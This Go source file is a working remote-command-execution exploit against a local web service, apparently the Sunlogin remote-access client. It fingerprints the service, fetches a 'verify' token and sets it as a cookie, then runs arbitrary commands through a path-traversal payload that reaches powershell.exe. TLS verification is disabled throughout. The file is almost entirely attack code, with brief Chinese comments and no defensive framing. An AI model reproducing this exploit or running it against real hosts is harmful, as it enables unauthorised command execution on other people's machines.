package main

import (
	"crypto/tls"
	"fmt"
	"net/url"
	"strings"
	"time"

	"github.com/go-resty/resty/v2"
	"github.com/tidwall/gjson"
)

func GetWebInfo(port string) bool { //获取指纹特征
	client := resty.New().SetTimeout(3 * time.Second).SetTLSClientConfig(&tls.Config{InsecureSkipVerify: true}) //忽略https证书错误，设置超时时间
	resp, err := client.R().EnableTrace().Get("http://" + localhost + ":" + port)
	if err != nil {
		//log.Println(err)
		return false
	}
	str := resp.Body()
	body := string(str)
	if strings.Contains(body, "Verification") {
		fmt.Println("[Info] 目标可能存在Rce!端口:", port)
		return true
	}
	return false
}
func GetVerify(port string) string { //获取Verify认证
	client := resty.New().SetTimeout(3 * time.Second).SetTLSClientConfig(&tls.Config{InsecureSkipVerify: true}) //忽略https证书错误，设置超时时间
	resp, err := client.R().EnableTrace().Get("http://" + localhost + ":" + port + "/cgi-bin/rpc?action=verify-haras")
	if err != nil {
		//log.Println(err)
		return ""
	}
	str := resp.Body()
	body := string(str)
	verify := fmt.Sprintf("%s", gjson.Get(body, "verify_string"))
	return verify
}
func RunCmd(cmd string, port string) string {
	client := resty.New().SetTimeout(3 * time.Second).SetTLSClientConfig(&tls.Config{InsecureSkipVerify: true}) //忽略https证书错误，设置超时时间
	//fmt.Printf(GetVerify())
	cmd = url.QueryEscape(cmd)
	client.Header.Set("Cookie", "CID="+GetVerify(port))
	resp, err := client.R().EnableTrace().Get("http://" + localhost + ":" + port + "/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+" + cmd)

	if err != nil {
		//log.Println(err)
		return ""
	}
	str := resp.Body()
	body := string(str)
	return body
}
